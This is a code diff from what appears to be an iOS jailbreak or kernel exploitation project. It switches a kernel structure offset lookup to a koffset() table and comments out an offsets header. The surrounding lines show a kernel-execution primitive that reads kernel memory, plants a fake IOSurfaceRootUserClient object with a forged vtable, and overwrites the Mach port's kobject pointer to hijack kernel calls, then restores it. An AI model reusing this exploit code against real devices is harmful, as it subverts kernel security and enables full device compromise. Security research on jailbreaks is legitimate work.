@@ -7,7 +7,7 @@
 
 #import "IOTypes.h"
 #import "find_port.h"
-#import "offsets.h"
+//#import "offsets.h"
 #include "KernelUtils.h"
 
 mach_port_t PrepareUserClient(void) {
@@ -49,7 +49,7 @@ void init_Kernel_Execute(void) {
     //
     //printf("Found port: 0x%llx\n", IOSurfaceRootUserClient_Port);
     
-    IOSurfaceRootUserClient_Addr = ReadKernel64(IOSurfaceRootUserClient_Port + off_ip_kobject); // The UserClient itself (the C++ object) is at the kobject field
+    IOSurfaceRootUserClient_Addr = ReadKernel64(IOSurfaceRootUserClient_Port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
     //
     //printf("Found addr: 0x%llx\n", IOSurfaceRootUserClient_Addr);
     
@@ -88,7 +88,7 @@ void init_Kernel_Execute(void) {
     WriteKernel64(FakeClient, FakeVtable);
     
     // Replace the user client with ours
-    WriteKernel64(IOSurfaceRootUserClient_Port + off_ip_kobject, FakeClient);
+    WriteKernel64(IOSurfaceRootUserClient_Port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), FakeClient);
     
     // Now the userclient port we have will look into our fake user client rather than the old one
     
@@ -108,7 +108,7 @@ void init_Kernel_Execute(void) {
 void term_Kernel_Execute(void) {
     if (!UserClient) return;
     
-    WriteKernel64(IOSurfaceRootUserClient_Port + off_ip_kobject, IOSurfaceRootUserClient_Addr);
+    WriteKernel64(IOSurfaceRootUserClient_Port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_Addr);
     kmem_free(FakeVtable, fake_Kernel_alloc_size);
     kmem_free(FakeClient, fake_Kernel_alloc_size);
 }
